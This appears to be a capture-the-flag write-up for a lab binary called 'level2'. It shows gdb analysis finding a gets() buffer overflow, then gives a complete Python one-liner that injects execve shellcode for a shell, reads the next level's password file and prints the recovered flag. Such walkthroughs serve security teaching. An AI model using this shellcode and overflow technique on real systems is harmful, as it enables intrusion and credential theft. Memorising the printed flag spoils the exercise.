HOW TO FIND THE FLAG:

As in the previous levels, let's try first to analyse the binary file level2 with gdb

gdb level2 => "info functions" to get the functions and their adresses

0x080484d4  p => p function called in the main function
0x0804853f  main => main function

disas main => the main function calls the p function

disas p => sub    $0x68,%esp => allocates 0x68 (104) bytes for local variables

lea    -0x4c(%ebp) => buffer begins 0x4c (76) bytes before esp and end Oxc (12) bytes before esp => buffer size 76 - 12 = 64 bytes 

Fills the buffer with gets ( buffer overflow vulnerability)

"and" + "cmp" operator to check if the eip is a variable on the stack (0xb0000000)

Here we will use a shellcode injection.

First we will the find the offset at which the overflow occurs. On the website https://wiremask.eu/tools/buffer-overflow-pattern-generator/, we generate a pattern of length 100. We then find that the offset is 80.

To create our shellcode injection we will need the shellcode : \x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80 of size 55 bytes + 25 bytes of any characters let's put 'A' + the return adress of the strdup which duplicates our buffer.

Let's put a breakpoint just after our strdup and print $eax => x/s $eax : 0x804a008 is the adress of the ret value of strdup.

Let's launch our shell

python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 25 + "\x08\xa0\x04\x08"' | ./level2

We are the into the shell. cat /home/user/level3/.pass => 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
